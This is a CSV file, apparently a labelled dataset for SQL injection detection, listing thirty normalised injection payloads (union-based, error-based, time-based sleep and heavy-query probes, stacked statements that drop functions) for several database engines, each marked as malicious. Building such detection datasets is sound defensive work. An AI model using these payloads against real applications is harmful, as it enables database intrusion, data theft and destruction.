row_index,payload_norm,label,sqli_type_hint
5280,-8812 or 6872 = 6872# dflr,1,
5281,1%' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and '%' = ',1,
5282,"1' ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 'iaud' = 'iaud",1,
5283,1 and ( 3020 = 3020 ) *6703-- zsnl,1,
5284,1 ) ) as rhwg where 8843 = 8843,1,
5285,-2495 ) ) as hudw where 4197 = 4197 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1,
5286,"-9697 ) union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",1,
5287,"-4068' ) ) ) union all select 9491,9491,9491--",1,
5288,"1%"" ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
5289,"elt ( 5098 = 2728,1 )",1,
5290,1' where 7882 = 7882 and 6663 = 4524--,1,
5291,"1%"" ) ) ) union all select null,null,null--",1,
5292,"1"" ) ) as bosq where 4695 = 4695",1,
5293,"-6463"" ) ) ) union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",1,
5294,"1' ) ) as nlfq where 3410 = 3410 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",1,
5295,"1' ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( 'ylql' like 'ylql",1,
5296,if ( 3593 = 3779 ) select 3593 else drop function qtqy--,1,
5297,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( 8535 = 8535",1,
5298,if ( 8995 = 9787 ) select 8995 else drop function ofgg--,1,
5299,"1"" ) rlike sleep ( 5 ) and ( ""efoq"" like ""efoq",1,
5300,"1' ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'pydi' like 'pydi",1,
5301,"1'+ ( select sshu where 3442 = 3442 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) +'",1,
5302,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'inec' = 'inec",1,
5303,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( '%' = ',1,
5304,"1"" ) as jscj where 2308 = 2308 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
5305,"1%' ) ) and make_set ( 6527 = 9529,9529 ) and ( ( '%' = '",1,
5306,"1 where 5401 = 5401 and elt ( 1210 = 1210,sleep ( 5 ) ) --",1,
5307,"1%' ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( '%' = '",1,
5308,"1%"" ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ""%"" = """,1,
5309,"1"" ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ""vdyr"" = ""vdyr",1,
